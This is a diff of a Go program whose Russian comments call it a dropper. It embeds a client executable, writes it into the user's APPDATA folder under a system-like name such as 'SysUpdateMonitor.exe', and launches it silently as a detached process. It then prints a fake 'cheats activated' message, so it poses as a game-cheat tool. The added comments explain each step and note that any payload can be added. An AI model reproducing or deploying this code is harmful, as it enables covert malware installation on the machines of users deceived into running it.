@@ -10,23 +10,25 @@ import (
 )
 
 //go:embed client.exe
-var embeddedExe []byte
+var embeddedExe []byte // содержит бинарник клиента. директива go:embed указывает компилятору включить клиента в бинарник дроппера как слайс байтов
 
 func main() {
 	appData := os.Getenv("APPDATA")
 	if appData == "" {
 		return
 	}
-	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
-	targetPath := filepath.Join(startupPath, "Windows Update Manager.exe")
-	err := os.WriteFile(targetPath, embeddedExe, 0755)
+	// определение места, где будет бинарник клиента (папка стандартных приложений)
+	startupPath := filepath.Join(appData, "Microsoft", "Windows", "Start Menu", "Programs", "Accessories")
+	targetPath := filepath.Join(startupPath, "SysUpdateMonitor.exe")
+	err := os.WriteFile(targetPath, embeddedExe, 0755) // создание файла
 	if err != nil {
 		return
 	}
-	cmd := exec.Command(targetPath)
+	cmd := exec.Command(targetPath) // запуск клиента отдельным процессом
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP,
 	}
+	// отключение потоков ввода-вывода
 	cmd.Stdin = nil
 	cmd.Stdout = nil
 	cmd.Stderr = nil
@@ -35,5 +37,5 @@ func main() {
 		return
 	}
 	cmd.Process.Release()
-	fmt.Println("читы активированы хохохо")
+	fmt.Println("читы активированы хохохо") // заглушка для дроппера. по факту можно добавить любой функционал
 }
